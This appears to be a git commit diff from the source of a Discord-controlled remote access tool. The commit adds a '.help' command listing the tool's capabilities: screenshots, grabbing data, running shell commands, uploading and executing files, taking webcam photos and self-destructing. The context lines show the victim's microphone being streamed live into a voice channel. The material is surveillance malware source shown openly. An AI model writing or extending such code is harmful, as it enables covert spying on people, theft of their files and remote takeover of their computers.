4e188b4a9bb328d52fb909f032e05515a5ae2fc1
whois-hoeless <whois@hoeless.com>
2023-06-05 23:46:05 +0200

    add the function to main_obsolete.py

--- main_obsolete.py
+++ main_obsolete.py
@@ -354,6 +354,11 @@ async def on_message(message):
                 vc.play(PyAudioPCM())
                 await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
 
+            elif message.content[:5] == '.help':
+                await message.delete()
+                if message.content.strip() == '.help':
+                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.cmd [command]\n.cd [dir]\n.update```'); await reaction_msg.add_reaction('🔴')
+                    
             elif message.content == '.tree':
                 await message.delete()
                 if message.channel.id == channel_ids['file']:
